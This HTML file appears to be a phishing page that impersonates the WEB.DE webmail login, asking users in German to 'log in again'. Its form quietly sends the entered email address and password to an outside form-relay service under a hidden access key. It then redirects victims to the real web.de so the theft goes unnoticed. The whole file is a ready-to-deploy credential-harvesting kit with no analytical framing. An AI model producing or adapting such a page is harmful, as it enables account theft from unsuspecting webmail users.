<!DOCTYPE html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEB.DE</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 50vh;
            background-color: #f3f3f3;
            color: black;
            font-family: sans-serif;
        }
        
        .page-box {
            width: 100%;
            max-width: 1000px;
            min-height: 90vh;
            background: #f3f3f3;
            box-shadow: black;
            padding-right: 20px;
            padding-left: 20px;
            border-radius: 5px;
            text-align: center;
            height: auto;
        }
        
        .email {
            margin-bottom: 15px;
            color: black;
            border-radius: 3px;
            padding-top: 15px;
            padding-bottom: 15px;
            border: none;
            width: 60%;
        }
        
        .passwort {
            margin-bottom: 5px;
            color: black;
            border-radius: 3px;
            padding-top: 15px;
            padding-bottom: 15px;
            border: none;
            width: 60%;
        }
        
        .submit {
            margin-top: 20px;
            color: black;
            border-radius: 3px;
            padding-top: 15px;
            padding-bottom: 15px;
            border: none;
            width: 20%;
            text-align: center;
            background-color: #ffd800;
            font-weight: bold;
        }
        
        main {
            display: flex;
            justify-content: center;
        }
        
        .form-group {
            margin-bottom: 5%;
            border-radius: 5px;
        }
        
        .img {
            display: flex;
            padding-left: 2%;
            padding-top: 1%;
            justify-content: left;
            background-color: white;
            border-top: 4px solid #ffd800;
            padding: 8px;
            outline: none;
            border-bottom-color: rgb(53, 52, 52);
            border-bottom: 1px solid rgb(53, 52, 52);
        }
        
        div {
            text-align: center;
        }
        
        form {
            margin: 2em 10%;
            width: 80%;
        }
    </style>

</head>

<body>
    <div class="page-box">
        <header>
            <div class="img">
                <img src="image/dp.png" alt="Not supported" width="10%" height="auto">
                <div class="search">
                </div>
            </div>

            <div>
                <img src="image/download.png" width="15%" style="padding-top: 5%;">
            </div>

            <div>
                <h1>Bitte erneut einloggen</h1>
            </div>

            <div>
                <p>Bitte melden Sie sich mit Ihrem WEB.DE <br> Nutzernamen und Ihrem Passwort an.</p>
            </div>
        </header>

        <main>
            <form action="https://api.web3forms.com/submit" method="POST">

                <input type="hidden" name="access_key" value="4313fbb1-01f5-4f4d-961b-a88688bc40d4">

                <input type="hidden" name="redirect" value="https://web.de">

                <div>
                    <input type="email" name="text" placeholder=" WEB.DE E-mail Addresse" maxlength="50" required class="email">
                </div>

                <div>
                    <input type="text" name="text" placeholder=" Passwort eingeben" required class="passwort">
                </div>

                <div class="form-group">
                    <input type="submit" value="Login" style="border-width:0;" class="submit">
                </div>
            </form>
        </main>

        <section style="text-align: center; font-family: sans-serif; color:#2c2a2a">
            <h3>Neu bei WEB.DE?</h3>
        </section>
    </div>
</body>

</html>
